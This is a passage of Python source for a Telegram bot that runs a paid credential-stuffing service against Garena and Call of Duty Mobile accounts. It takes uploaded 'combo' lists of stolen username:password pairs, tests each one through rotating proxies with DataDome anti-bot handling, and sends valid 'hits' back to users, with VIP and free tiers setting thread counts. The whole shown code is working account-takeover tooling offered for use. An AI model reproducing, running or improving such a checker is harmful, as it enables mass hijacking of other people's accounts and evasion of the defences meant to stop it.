            f"<i>Rename your file and send it again.</i>")
        return

    file_id = document.get("file_id")
    dl_url  = _tg_get_file_url(token, file_id)
    if not dl_url:
        _tg_send(token, chat_id, "❌ Could not get download link. Try again.")
        return

    # Download
    save_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "combo")
    os.makedirs(save_dir, exist_ok=True)
    # Unique filename per user to avoid collisions between concurrent users
    safe_name = f"{chat_id}_{file_name}"
    save_path = os.path.join(save_dir, safe_name)
    try:
        r = requests.get(dl_url, timeout=30)
        r.raise_for_status()
        with open(save_path, "wb") as f:
            f.write(r.content)
    except Exception as e:
        _tg_send(token, chat_id, f"❌ Download failed: {e}")
        return

    # Read raw lines
    raw_lines = []
    for enc in ["utf-8", "latin-1", "cp1252", "iso-8859-1"]:
        try:
            with open(save_path, "r", encoding=enc, errors="ignore") as fh:
                raw_lines = fh.readlines()
            break
        except Exception:
            continue

    if not raw_lines:
        _tg_send(token, chat_id, "⚠️ Could not read the file. Please try again.")
        try: os.remove(save_path)
        except: pass
        return

    # Smart parse
    clean_lines, skipped, fmt = _parse_combo_lines(raw_lines)

    if not clean_lines:
        not_garena_total = fmt.get("not_garena", 0)
        if not_garena_total > 0:
            _tg_send(token, chat_id,
                f"🚫 <b>No valid Garena accounts found!</b>\n\n"
                f"<code>{not_garena_total}</code> lines were filtered out — they don't look like Garena credentials.\n\n"
                f"Garena accounts use:\n"
                f"  • Email: <code>user@gmail.com:pass</code>\n"
                f"  • Phone: <code>09123456789:pass</code>\n"
                f"  • Username: <code>myaccount123:pass</code>\n\n"
                f"Rename so the filename contains 'garena' or 'codm', e.g. <code>garena.txt</code>")
        else:
            _tg_send(token, chat_id,
                "⚠️ <b>No valid combo lines found.</b>\n\n"
                "Make sure lines are in format:\n"
                "<code>user:pass</code>  or  <code>url:user:pass</code>")
        try: os.remove(save_path)
        except: pass
        return

    # Enforce limit — owner and VIP key users have no limit
    d_now        = _udata(chat_id)
    is_owner_upload = _is_owner(from_user) if from_user else False
    is_vip = _is_vip_user(chat_id)
    user_limit   = None if (is_owner_upload or is_vip) else d_now.get("combo_limit", COMBO_LINE_LIMIT)
    total_parsed = len(clean_lines)
    truncated    = (not is_owner_upload and not is_vip) and (user_limit is not None) and (total_parsed > user_limit)
    if truncated:
        clean_lines = clean_lines[:user_limit]

    # Save cleaned file (unique per user)
    clean_path = os.path.join(save_dir, f"clean_{safe_name}")
    with open(clean_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(clean_lines) + "\n")

    # Format summary
    fmt_parts = []
    if fmt["plain"]          > 0: fmt_parts.append(f"  • <code>user:pass</code>: {fmt['plain']}")
    if fmt["url_stripped"]   > 0: fmt_parts.append(f"  • url stripped: {fmt['url_stripped']}")
    if fmt["extra_stripped"] > 0: fmt_parts.append(f"  • extra stripped: {fmt['extra_stripped']}")
    fmt_text   = "\n".join(fmt_parts)
    not_garena = fmt.get("not_garena", 0)
    garena_note = (
        f"\n🚫 <b>Non-Garena filtered:</b> <code>{not_garena}</code> lines\n"
        if not_garena > 0 else ""
    )
    limit_note = (
        f"\n⚠️ <b>Truncated to {user_limit} lines</b> "
        f"({total_parsed - user_limit} ignored)\n"
        if truncated else ""
    )
    limit_display = "∞ unlimited" if (is_owner_upload or is_vip) else f"{user_limit}"

    # Build per-user telegram_config
    d         = _udata(chat_id)
    hits_id   = d["hits_id"]
    lvl_label = "ALL" if d["level"] == [1] else f"{d['level'][0]}+"
    cf_map    = {"clean": "✅ CLEAN", "notclean": "❌ NOT CLEAN", "both": "🔄 BOTH"}
    user_telegram_config = (BOT_TOKEN, str(hits_id), d["level"], "", d["clean_filter"])

    # ── If no proxies: save combo and register as proxy-paused ──
    _is_owner_user = _is_owner(from_user) if from_user else False
    if not _has_proxies() and not _is_owner_user:
        _register_proxy_paused(chat_id, clean_path, file_name, clean_lines, d)
        with _state_lock:
            _bot_state[chat_id] = "AWAIT_FILE"
        _tg_send(token, chat_id,
            f"📄 <b>File received & saved!</b>\n\n"
            f"<code>{file_name}</code> — {len(clean_lines)} accounts\n\n"
            f"⏳ <b>No proxies available right now.</b>\n"
            f"Your check will <b>auto-resume</b> as soon as proxies are back!\n\n"
            f"<i>You don\'t need to re-upload. Just wait — I\'ll notify you.</i>"
        )
        # Clean up the temp combo/ files (persistent copy is in saved_combos/)
        for p in (save_path, clean_path):
            try:
                if p and os.path.exists(p):
                    os.remove(p)
            except Exception:
                pass
        return

    with _state_lock:
        _bot_state[chat_id] = "RUNNING"

    # ── Save active session for auto-resume on crash ───────────
    _save_active_session(chat_id, clean_path, file_name, clean_lines, d)

    # ── Create a per-user stop event ───────────────────────────
    stop_evt = threading.Event()
    with _stop_events_lock:
        _stop_events[chat_id] = stop_evt

    _tg_send(token, chat_id,
        f"🚀 <b>File received! Starting checker...</b>\n\n"
        f"📄 <b>File:</b> <code>{file_name}</code>\n"
        f"📊 <b>Parsed:</b> <code>{total_parsed}</code>  "
        f"✅ <b>Checking:</b> <code>{len(clean_lines)}</code>  "
        f"🗑 <b>Skipped:</b> <code>{skipped}</code>"
        f"{garena_note}"
        f"{limit_note}\n"
        f"📋 <b>Formats:</b>\n{fmt_text}\n\n"
        f"🎮 <b>Level:</b> <code>{lvl_label}</code>  "
        f"🔍 <b>Hits:</b> <code>{cf_map[d['clean_filter']]}</code>\n"
        f"📩 <b>Sending hits to:</b> <code>{hits_id}</code>\n"
        f"📦 <b>Limit:</b> <code>{limit_display}</code>\n"
        f"🧵 <b>Threads:</b> <code>{VIP_THREADS_PER_USER if (_is_vip_user(chat_id) or chat_id == OWNER_ID or chat_id in COOWNER_IDS) else FREE_THREADS_PER_USER}</code>"
        f"{'  ⭐ VIP (no queue)' if (_is_vip_user(chat_id) or chat_id == OWNER_ID or chat_id in COOWNER_IDS) else '  🆓 Free (queued)'}\n\n"
        f"<i>Hits will appear as they come in... Send /stop to cancel.</i>"
    )

    # Mutable container so _cleanup_files() closure can read result_folder
    # after it gets assigned inside _run()'s try block
    _rf = [""]   # _rf[0] = result_folder path, set when checker returns

    def _cleanup_files():
        """Delete all temp files for this run — called in every exit path."""
        import shutil

        # ── Delete uploaded combo files ─────────────────────────
        for p in (save_path, clean_path):
            try:
                if p and os.path.exists(p):
                    os.remove(p)
            except Exception:
                pass

        # ── Delete result folder (read from shared container) ───
        try:
            rf = _rf[0]
            if rf and os.path.isdir(rf):
                shutil.rmtree(rf, ignore_errors=True)
        except Exception:
            pass

        # ── Safety net: remove any leftover combo/ files for this user ──
        try:
            base      = os.path.dirname(os.path.abspath(__file__))
            combo_dir = os.path.join(base, "combo")
            if os.path.isdir(combo_dir):
                for f in os.listdir(combo_dir):
                    if f.startswith(str(chat_id)):
                        try:
                            os.remove(os.path.join(combo_dir, f))
                        except Exception:
                            pass
        except Exception:
            pass

    def _run():
        stopped = False
        # ── Enforce max concurrent users ───────────────────────
        running_now = sum(1 for s in _bot_state.values() if s == "RUNNING")
        if running_now > MAX_CONCURRENT_USERS:
            _tg_send(token, chat_id,
                f"⏳ <b>Server is busy!</b>\n\n"
                f"There are already <b>{running_now}</b> checkers running.\n"
                f"Max allowed: <b>{MAX_CONCURRENT_USERS}</b>\n\n"
                f"Please wait a few minutes and try again.")
            with _state_lock:
                _bot_state[chat_id] = "AWAIT_FILE"
            with _stop_events_lock:
                _stop_events.pop(chat_id, None)
            _cleanup_files()
            return
        try:
            d     = _udata(chat_id)
            uname = d.get("username", "")
            label = f"@{uname}" if uname else f"id:{chat_id}"
            stats, result_folder = _run_checker_for_file(
                clean_path, user_telegram_config,
                chat_id=chat_id, label=label,
                stop_event=stop_evt
            )
            _rf[0] = result_folder   # store in shared container for _cleanup_files
            stopped = stop_evt.is_set()
        except MemoryError:
            stats    = {}
            _rf[0]   = ""
            gc.collect()
            logger.error(f"[BOT] MemoryError during check — forcing GC")
            try:
                _tg_send(token, chat_id, "⚠️ <b>Out of memory!</b> Try again with a smaller file.")
            except Exception:
                pass
        except Exception as e:
            stats    = {}
            _rf[0]   = ""
            logger.error(f"[BOT] Checker error: {e}", exc_info=True)
        finally:
            with _state_lock:
                _bot_state[chat_id] = "AWAIT_FILE"
            with _stop_events_lock:
                _stop_events.pop(chat_id, None)
            # Remove from active sessions (no longer needs resume)
            _remove_active_session(chat_id)

            if stopped:
                _tg_send(token, chat_id,
                    "🛑 <b>Checker stopped by user.</b>\n\n"
                    f"📊 <b>Partial results for</b> <code>{file_name}</code>\n"
                    f"✅ Valid: <code>{stats.get('valid',0)}</code>  "
                    f"❌ Invalid: <code>{stats.get('invalid',0)}</code>\n"
                    f"🧹 Clean: <code>{stats.get('clean',0)}</code>  "
                    f"⚠️ Not Clean: <code>{stats.get('not_clean',0)}</code>"
                )
            else:
                valid      = stats.get("valid", 0)
                invalid    = stats.get("invalid", 0)
                clean_c    = stats.get("clean", 0)
                not_clean  = stats.get("not_clean", 0)
                has_codm   = stats.get("has_codm", 0)
                total_done = stats.get("total", 0)

                _tg_send(token, chat_id,
                    f"✅ <b>Checker Finished!</b>\n\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 <b>Final Results for</b> <code>{file_name}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"✅ <b>Valid:</b>      <code>{valid}</code>\n"
                    f"❌ <b>Invalid:</b>    <code>{invalid}</code>\n"
                    f"🧹 <b>Clean:</b>     <code>{clean_c}</code>\n"
                    f"⚠️ <b>Not Clean:</b> <code>{not_clean}</code>\n"
                    f"🎮 <b>Has CODM:</b>  <code>{has_codm}</code>\n"
                    f"📦 <b>Total:</b>     <code>{total_done}</code>"
                )

            # ── Send zip FIRST, then delete everything ─────────
            if _rf[0] and os.path.isdir(_rf[0]):
                _send_results_zip(token, chat_id, _rf[0], file_name)
            elif not stopped:
                _tg_send(token, chat_id,
                    "📭 <b>No result files</b> — no valid hits found.")

            # ── Delete combo files + result folder ──────────────
            _cleanup_files()

            # Force GC after each check run to free memory on Railway
            gc.collect()

            _tg_send(token, chat_id,
                f"📂 Send your next combo file to check again.\n"
                f"<i>garena.txt · codm.txt · Yuki_garena.txt etc.</i>\n"
                f"Or /start to reset your settings.")
    threading.Thread(target=_run, daemon=True).start()


# ── zip result folder and send to user ────────────────────────
def _send_results_zip(token: str, chat_id, result_folder: str, original_name: str):
    """Collect all non-empty .txt files in result_folder, zip them, send to user."""
    import zipfile, io

    # Collect non-empty txt files (walk subdirs too for level folders)
    files_to_zip = []
    for root, dirs, files in os.walk(result_folder):
        for fname in files:
            fpath = os.path.join(root, fname)
            if os.path.getsize(fpath) > 0:
                files_to_zip.append(fpath)

    if not files_to_zip:
        _tg_send(token, chat_id,
            "📭 <b>No result files to send</b> — no valid hits were found.")
        return

    # Build zip in memory
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for fpath in files_to_zip:
            # Preserve subfolder structure inside zip
            arcname = os.path.relpath(fpath, os.path.dirname(result_folder))
            zf.write(fpath, arcname)
    zip_buffer.seek(0)

    # Name: results_<chat_id>_<date>_<time>.zip
    ts       = time.strftime("%Y%m%d_%H%M%S")
    zip_name = f"results_{chat_id}_{ts}.zip"

    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        requests.post(
            url,
            data={
                "chat_id":    chat_id,
                "caption":    f"📦 <b>Your result files</b> — enjoy! 🎯",
                "parse_mode": "HTML",
            },
            files={"document": (zip_name, zip_buffer, "application/zip")},
            timeout=60,
        )
    except Exception as e:
        logger.warning(f"[BOT] sendDocument zip error: {e}")
        _tg_send(token, chat_id, "❌ Failed to send zip file. Please try again.")


# ── send a single file as Telegram document ───────────────────
def _send_document(token: str, chat_id, filepath: str, caption: str = ""):
    """Upload a local file to a Telegram chat as a document."""
    if not os.path.exists(filepath) or os.path.getsize(filepath) == 0:
        return
    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        with open(filepath, "rb") as f:
            requests.post(
                url,
                data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
                files={"document": (os.path.basename(filepath), f, "text/plain")},
                timeout=15,
            )
    except Exception as e:
        logger.warning(f"[BOT] sendDocument error: {e}")
# Global registry so multiple users' bars show simultaneously
_active_bars : dict = {}   # chat_id -> { label, done, total, speed, start_time }
_bars_lock           = threading.Lock()
_prev_bar_count      = [0]   # how many lines we drew last frame


def _render_bars():
    """
    Single background thread — redraws all active progress bars in-place.
    Style matches Image 2:  id:XXXXXXXXX [████░░░░░░░] 32.3%  97/300  1/s
    One line per user. Nothing else prints to terminal in BOT_MODE.

    On non-TTY (Railway logs), only prints a summary line every 5 seconds
    to avoid log spam. On a real terminal, uses ANSI in-place refresh.
    """
    import sys

    BAR_LEN = 30          # bar width in chars
    IS_TTY  = sys.stdout.isatty()  # Railway logs are NOT a TTY
    REFRESH = 0.5 if IS_TTY else 5.0  # 0.5s on TTY, 5s on logs
    _last_log_time = 0

    # ANSI colours
    CYAN   = "\033[1;96m"
    GREEN  = "\033[1;92m"
    YELLOW = "\033[1;93m"
    WHITE  = "\033[1;37m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

    while True:
        time.sleep(REFRESH)
        with _bars_lock:
            bars = list(_active_bars.items())

        if not bars:
            _prev_bar_count[0] = 0
            continue

        lines = []
        for cid, b in bars:
            done  = b["done"]
            total = b["total"]
            speed = b["speed"]
            pct   = done / total if total else 0
            filled = int(BAR_LEN * pct)
            bar    = "█" * filled + "░" * (BAR_LEN - filled)

            line = (
                f"  {CYAN}id:{cid}{RESET} "
                f"[{GREEN}{bar}{RESET}] "
                f"{YELLOW}{pct*100:>5.1f}%{RESET}  "
                f"{WHITE}{done}/{total}{RESET}  "
                f"{DIM}{speed}/s{RESET}"
            )
            lines.append(line)

        if IS_TTY:
            # Real terminal: use ANSI cursor movement to overwrite in-place
            prev = _prev_bar_count[0]
            out  = ""
            if prev > 0:
                out += f"\033[{prev}A"   # move cursor up to overwrite previous bars
            for line in lines:
                out += f"\033[2K{line}\n"
            # Clear any leftover lines from a previous larger count
            for _ in range(max(0, prev - len(lines))):
                out += "\033[2K\n"
            sys.stdout.write(out)
            sys.stdout.flush()
            _prev_bar_count[0] = len(lines)
        else:
            # Non-TTY (Railway logs): just print a compact single-line summary
            # to avoid spamming the log with hundreds of lines
            now = time.time()
            if now - _last_log_time >= 5.0:
                summary_parts = []
                for cid, b in bars:
                    done  = b["done"]
                    total = b["total"]
                    speed = b["speed"]
                    pct   = done / total * 100 if total else 0
                    summary_parts.append(f"id:{cid} {pct:.0f}% {done}/{total} {speed}/s")
                logger.info(f"[PROGRESS] {' | '.join(summary_parts)}")
                _last_log_time = now


# Start the renderer once (daemon — dies with the main process)
threading.Thread(target=_render_bars, daemon=True).start()


class _BotLogFilter(logging.Filter):
    """In BOT_MODE: drop most log output but allow important system messages through.
    Proxy fetch, HEARTBEAT, and error-level messages are always shown."""
    # Prefixes that should always be visible even in BOT_MODE
    ALLOWED_PREFIXES = (
        "[RAW-PROXY]",
        "[PROXY-VAL]",
        "[HEARTBEAT]",
        "[MAIN]",
        "[DATADOME]",
    )

    def filter(self, record):
        if not BOT_MODE:
            return True
        # Always allow ERROR and CRITICAL level messages
        if record.levelno >= logging.ERROR:
            return True
        # Allow specific important prefixes
        msg = record.getMessage()
        for prefix in self.ALLOWED_PREFIXES:
            if prefix in msg:
                return True
        # Drop everything else (per-account noise, proxy rotation, etc.)
        return False


# Attach the filter to every handler on the root logger
def _apply_bot_log_filter():
    f = _BotLogFilter()
    root = logging.getLogger()
    for handler in root.handlers:
        handler.addFilter(f)
    root.addFilter(f)

_apply_bot_log_filter()


# ──────────────────────────────────────────────────────────────
#  VIP/FREE PRIORITY QUEUE SYSTEM
#  ── VIP keys: NO queue — instant processing, dedicated threads
#  ── Free keys: HAVE queue — wait in line for limited slots
#  ── Semaphore-first design prevents race conditions
# ──────────────────────────────────────────────────────────────

from queue import Queue as _ThreadQueue

class VipFreeQueue:
    """
    Priority queue for VIP/Free account processing.
    
    - VIP accounts: NO queue — workers acquire semaphore (always available),
      then grab account. Since # VIP workers = vip_threads, semaphore never
      blocks → instant processing.
    - Free accounts: HAVE queue — workers acquire semaphore FIRST (blocks if
      all free_threads slots taken = QUEUE), then grab account. This IS the
      queue mechanism.
    
    CRITICAL: Semaphore is acquired BEFORE pulling from queue.
    This prevents the race condition where a worker pulls an account but
    then blocks on the semaphore, making that account invisible.
    """

    def __init__(self, vip_threads: int, free_threads: int):
        self.vip_queue = _ThreadQueue()
        self.free_queue = _ThreadQueue()
        self._lock = threading.Lock()
        self._vip_added = 0
        self._free_added = 0
        self._vip_done = 0
        self._free_done = 0
        self._total = 0
        self._done = 0
        self._stop_event = threading.Event()
        self.vip_threads = vip_threads
        self.free_threads = free_threads

        # VIP semaphore: matches # of VIP workers → never blocks (no queue)
        # Free semaphore: limits concurrent Free workers → THIS IS THE QUEUE
        self._vip_sem = threading.Semaphore(vip_threads)
        self._free_sem = threading.Semaphore(free_threads)

        # Track accounts "in flight" (pulled from queue but not yet done)
        self._vip_in_flight = 0
        self._free_in_flight = 0

    def add_vip(self, account: dict):
        """Add VIP account — NO queue, goes straight to processing."""
        with self._lock:
            self._vip_added += 1
            self._total += 1
        self.vip_queue.put(account)

    def add_free(self, account: dict):
        """Add Free account — goes into the queue, waits for available slot."""
        with self._lock:
            self._free_added += 1
            self._total += 1
        self.free_queue.put(account)

    def acquire_vip_slot(self, timeout: float = None) -> bool:
        """Acquire a VIP processing slot. Returns True if acquired."""
        return self._vip_sem.acquire(timeout=timeout)

    def release_vip_slot(self):
        """Release a VIP processing slot."""
        self._vip_sem.release()

    def acquire_free_slot(self, timeout: float = None) -> bool:
        """Acquire a Free processing slot. BLOCKS if all free slots taken = QUEUE."""
        return self._free_sem.acquire(timeout=timeout)

    def release_free_slot(self):
        """Release a Free processing slot."""
        self._free_sem.release()

    def get_vip(self):
        """Get next VIP account (non-blocking). Returns None if empty."""
        try:
            account = self.vip_queue.get_nowait()
            with self._lock:
                self._vip_in_flight += 1
            return account
        except Exception:
            return None

    def get_free(self):
        """Get next Free account (non-blocking). Returns None if empty."""
        try:
            account = self.free_queue.get_nowait()
            with self._lock:
                self._free_in_flight += 1
            return account
        except Exception:
            return None

    def mark_vip_done(self):
        with self._lock:
            self._vip_done += 1
            self._done += 1
            self._vip_in_flight = max(0, self._vip_in_flight - 1)

    def mark_free_done(self):
        with self._lock:
            self._free_done += 1
            self._done += 1
            self._free_in_flight = max(0, self._free_in_flight - 1)

    @property
    def vip_pending(self):
        return self.vip_queue.qsize()

    @property
    def free_pending(self):
        return self.free_queue.qsize()

    @property
    def vip_remaining(self):
        """Accounts still in queue + in flight."""
        with self._lock:
            return self.vip_queue.qsize() + self._vip_in_flight

    @property
    def free_remaining(self):
        """Accounts still in queue + in flight."""
        with self._lock:
            return self.free_queue.qsize() + self._free_in_flight

    @property
    def progress(self):
        with self._lock:
            if self._total == 0:
                return 0
            return (self._done / self._total) * 100

    def all_done(self):
        """True when every added account has been fully processed."""
        with self._lock:
            return self._done >= self._total and self._total > 0

    def stop(self):
        self._stop_event.set()

    def should_stop(self):
        return self._stop_event.is_set()


def _get_user_tier(chat_id) -> str:
    """
    Get the key tier for a user: 'vip' or 'free'.
    Returns 'vip' if user has a valid vip-tier key, 'free' otherwise.
    Also caches tier in user data so we don't have to look up the key every time.
    """
    d = _udata(chat_id)
    # Check cached tier first
    cached_tier = d.get("key_tier")
    key = d.get("key")
    key_expires = d.get("key_expires", 0)
    
    # If key is valid, look up its tier from the keys store
    if key and time.time() < key_expires:
        keys = _load_keys()
        entry = keys.get(key)
        if entry:
            tier = entry.get("tier", "free")
            # Cache it
            d["key_tier"] = tier
            return tier
        # Key not in store — check saved profile
        saved = _get_saved_profile(str(chat_id))
        if saved and saved.get("key_tier"):
            tier = saved["key_tier"]
            d["key_tier"] = tier
            return tier
    
    # No valid key — return 'free' (unregistered users are free tier)
    return cached_tier or "free"


def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, label: str = "user", stop_event=None) -> tuple:
    """Returns (stats_dict, result_folder_path)"""
    if not os.path.exists(filepath):
        logger.error(f"[BOT] File not found: {filepath}")
        return {}, ""

    base          = os.path.splitext(os.path.basename(filepath))[0]
    result_folder = os.path.join(os.path.dirname(os.path.abspath(filepath)), f"{base}_results")
    os.makedirs(result_folder, exist_ok=True)

    accounts = []
    for enc in ["utf-8", "latin-1", "cp1252", "iso-8859-1"]:
        try:
            with open(filepath, "r", encoding=enc, errors="ignore") as fh:
                accounts = [l.strip() for l in fh
                            if l.strip() and ":" in l and not l.startswith("===")]
            break
        except UnicodeDecodeError:
            continue
        except Exception:
            break

    if not accounts:
        logger.error("[BOT] No valid accounts in file.")
        return {}, result_folder

    total            = len(accounts)
    # ── Determine user tier: VIP = no queue, Free = queued ──
    is_owner = (chat_id == OWNER_ID or chat_id in COOWNER_IDS) if chat_id else False
    is_vip = _is_vip_user(chat_id) if chat_id else False
    user_tier = _get_user_tier(chat_id) if chat_id else "free"
    # Owner always counts as VIP tier
    if is_owner:
        user_tier = "vip"
        is_vip = True

    # ── Pick thread count based on tier ──
    # VIP: VIP_THREADS_PER_USER threads, NO QUEUE — instant processing
    # Free: FREE_THREADS_PER_USER threads, HAS QUEUE — waits for slot
    if user_tier == "vip" or is_vip or is_owner:
        vip_threads = VIP_THREADS_PER_USER
        free_threads = 0
    else:
        vip_threads = 0
        free_threads = FREE_THREADS_PER_USER

    tier_label = "⭐ VIP (no queue)" if (user_tier == "vip" or is_vip or is_owner) else "🆓 Free (queued)"
    logger.info(f"[CHECKER] {label} → VIP:{vip_threads} Free:{free_threads} threads ({tier_label})")
    cookie_manager   = CookieManager()
    live_stats       = LiveStats()
    live_stats.start_tracking(total)
    print_lock       = threading.Lock()
    thread_local     = threading.local()
    thread_init_lock = threading.Lock()
    _all_sessions    = []          # track every thread session for cleanup
    _all_sessions_lock = threading.Lock()

    # ── Register progress bar entry ────────────────────────────
    bar_key = chat_id or label
    start_t = time.time()
    with _bars_lock:
        _active_bars[bar_key] = {
            "label": label,
            "done":  0,
            "total": total,
            "speed": 0,
            "start_time": start_t,
            "live_stats": live_stats,
        }

    done_count = [0]

    # ── Telegram live progress updater ─────────────────────────
    _progress_msg_id = [None]   # mutable container for message_id
    _progress_stop   = threading.Event()

    def _tg_progress_updater():
        """Background thread: sends/edits a fancy progress message every 10s."""
        tg_token = telegram_config[0] if telegram_config else None
        tg_chat  = chat_id
        if not tg_token or not tg_chat:
            return
        last_text = ""
        while not _progress_stop.is_set():
            _progress_stop.wait(10)
            if _progress_stop.is_set():
                break
            try:
                fancy = live_stats.get_fancy_telegram_progress()
                if not fancy or fancy == last_text:
                    continue
                last_text = fancy
                if _progress_msg_id[0]:
                    _tg_api(tg_token, "editMessageText",
                            chat_id=tg_chat, message_id=_progress_msg_id[0],
                            text=fancy)
                else:
                    resp = _tg_api(tg_token, "sendMessage",
                                   chat_id=tg_chat, text=fancy)
                    if resp and resp.get("ok"):
                        _progress_msg_id[0] = resp["result"]["message_id"]
            except Exception:
                pass

    progress_thread = threading.Thread(target=_tg_progress_updater, daemon=True)
    progress_thread.start()

    def get_session():
        if not hasattr(thread_local, "session"):
            dm = DataDomeManager()
            thread_local.session = create_thread_session(cookie_manager, dm)
            thread_local.dm      = dm
            # Only update proxies if we have some (create_thread_session already set them)
            proxy_dict = geo_rotator.get_proxies()
            if proxy_dict:
                thread_local.session.proxies.update(proxy_dict)
            with _all_sessions_lock:
                _all_sessions.append(thread_local.session)
        else:
            # Refresh proxy for existing session
            proxy_dict = geo_rotator.get_proxies()
            if proxy_dict:
                thread_local.session.proxies.update(proxy_dict)
            else:
                # No proxies available — clear proxy settings (try direct)
                thread_local.session.proxies.clear()
        return thread_local.session, thread_local.dm

    # ── Helper: process a single account line ──
    def _do_account(line, account_idx):
        """Process one account. Returns True if processed, False if skipped."""
        if ":" not in line:
            return False
        if stop_event and stop_event.is_set():
            return False
        if shutdown_event.is_set():
            return False
        user, pwd = line.split(":", 1)
        sess, dm  = get_session()
        processaccount(sess, user.strip(), pwd.strip(),
                       cookie_manager, dm, live_stats,
                       result_folder, telegram_config=telegram_config)
        return True

    def _update_progress():
        """Update progress bar and persist progress."""
        with _bars_lock:
            if bar_key in _active_bars:
                done_count[0] += 1
                elapsed = max(time.time() - start_t, 0.001)
                speed   = int(done_count[0] / elapsed)
                _active_bars[bar_key]["done"]  = done_count[0]
                _active_bars[bar_key]["speed"] = speed
        # Persist progress every 50 accounts for crash recovery
        if chat_id and done_count[0] % 50 == 0:
            _update_session_progress(chat_id, done_count[0])

    # ════════════════════════════════════════════════════════════════
    #  VIP/FREE QUEUE WORKER SYSTEM
    #
    #  VIP users: NO QUEUE — workers acquire semaphore (always available),
    #    then grab account → instant processing.
    #  Free users: HAVE QUEUE — workers acquire semaphore FIRST (blocks if
    #    all free_threads slots taken), then grab account → queued.
    #
    #  Semaphore-first design prevents race conditions where a worker
    #  pulls an account but blocks on semaphore, making account invisible.
    # ════════════════════════════════════════════════════════════════

    # Create priority queue with the user's thread allocation
    pq = VipFreeQueue(vip_threads or 1, free_threads or 1)

    # Add all accounts to the appropriate queue based on user tier
    # ALL accounts from this user go to the SAME queue (VIP or Free)
    # because the tier is per-USER, not per-account
    for idx, line in enumerate(accounts, 1):
        account = {"username": line.split(":")[0].strip() if ":" in line else "",
                   "password": line.split(":", 1)[1].strip() if ":" in line else "",
                   "line": line, "idx": idx}
        if user_tier == "vip" or is_vip or is_owner:
            pq.add_vip(account)
        else:
            pq.add_free(account)

    # ── VIP Worker: Acquires slot FIRST (instant), then processes account ──
    # KEY: VIP semaphore is acquired BEFORE pulling from queue.
    # Since # of VIP workers = vip_threads, the semaphore always has slots
    # available → NO QUEUE for VIP accounts.
    def vip_worker():
        while not pq.should_stop():
            # Step 1: Acquire VIP slot (instant — dedicated VIP pool)
            if not pq.acquire_vip_slot(timeout=0.5):
                # Timeout — check if there's still work
                if pq.vip_remaining == 0:
                    break
                if stop_event and stop_event.is_set():
                    break
                if shutdown_event.is_set():
                    break
                continue

            # Step 2: Get next VIP account
            account = pq.get_vip()
            if account is None:
                # No account in queue — release slot and wait
                pq.release_vip_slot()
                if pq.vip_remaining == 0:
                    break
                if stop_event and stop_event.is_set():
                    break
                if shutdown_event.is_set():
                    break
                time.sleep(0.05)
                continue

            # Step 3: Acquire global VPS slot, then process
            _global_thread_sem.acquire()
            try:
                if stop_event and stop_event.is_set():
                    return
                if shutdown_event.is_set():
                    return
                _do_account(account['line'], account['idx'])
            except Exception as e:
                logger.debug(f"[VIP-WORKER] Error: {e}")
            finally:
                _global_thread_sem.release()
                pq.release_vip_slot()
                pq.mark_vip_done()
                _update_progress()

    # ── Free Worker: Acquires slot FIRST (BLOCKS if full = QUEUE), then processes ──
    # KEY: Free semaphore is acquired BEFORE pulling from queue.
    # If all free_threads slots are taken, the worker WAITS here — this IS the queue.
    # Once a slot opens up, the worker grabs the next account and processes it.
    def free_worker():
        while not pq.should_stop():
            # Step 1: Acquire Free slot — THIS IS THE QUEUE
            # If all free_threads slots are busy, worker blocks here until one opens
            if not pq.acquire_free_slot(timeout=0.5):
                # Timeout — check if there's still work
                if pq.free_remaining == 0:
                    break
                if stop_event and stop_event.is_set():
                    break
                if shutdown_event.is_set():
                    break
                continue

            # Step 2: Get next Free account (now that we have a slot)
            account = pq.get_free()
            if account is None:
                # No account in queue — release slot and wait
                pq.release_free_slot()
                if pq.free_remaining == 0:
                    break
                if stop_event and stop_event.is_set():
                    break
                if shutdown_event.is_set():
                    break
                time.sleep(0.05)
                continue

            # Step 3: Acquire global VPS slot, then process
            _global_thread_sem.acquire()
            try:
                if stop_event and stop_event.is_set():
                    return
                if shutdown_event.is_set():
                    return
                _do_account(account['line'], account['idx'])
            except Exception as e:
                logger.debug(f"[FREE-WORKER] Error: {e}")
            finally:
                _global_thread_sem.release()
                pq.release_free_slot()
                pq.mark_free_done()
                _update_progress()

    # ── Start workers ──
    workers = []

    if vip_threads > 0:
        # VIP workers — always running, drain VIP queue instantly (NO QUEUE)
        for i in range(vip_threads):
            t = threading.Thread(target=vip_worker, name=f"VIP-{i+1}", daemon=True)
            t.start()
            workers.append(t)

    if free_threads > 0:
        # Free workers — limited, processes Free queue (HAS QUEUE)
        for i in range(free_threads):
            t = threading.Thread(target=free_worker, name=f"FREE-{i+1}", daemon=True)
            t.start()
            workers.append(t)

    # ── Wait for all accounts to be fully processed ──
    while not pq.all_done():
        if stop_event and stop_event.is_set():
            pq.stop()
            break
        if shutdown_event.is_set():
            pq.stop()
            break
        time.sleep(1)

    # Signal stop to all workers
    pq.stop()

    # Wait for workers to finish
    for t in workers:
        t.join(timeout=3)

    # ── Stop the progress updater ──────────────────────────────
    _progress_stop.set()
    progress_thread.join(timeout=3)

    # ── Send final progress snapshot ───────────────────────────
    try:
        tg_token = telegram_config[0] if telegram_config else None
        if tg_token and chat_id:
            final_fancy = live_stats.get_fancy_telegram_progress()
            if final_fancy:
                final_text = final_fancy.replace("⚡️ Checking…", "✅ Checking Complete!")
                if _progress_msg_id[0]:
                    _tg_api(tg_token, "editMessageText",
                            chat_id=chat_id, message_id=_progress_msg_id[0],
                            text=final_text)
                else:
                    _tg_api(tg_token, "sendMessage",
                            chat_id=chat_id, text=final_text)
    except Exception:
        pass

    # ── Close ALL thread sessions to free connections + memory ──
    with _all_sessions_lock:
        for sess in _all_sessions:
            try:
                sess.close()
            except Exception:
                pass
        _all_sessions.clear()

    gc.collect()

    # ── Remove bar + print done line so terminal stays clean ──
    with _bars_lock:
        _active_bars.pop(bar_key, None)

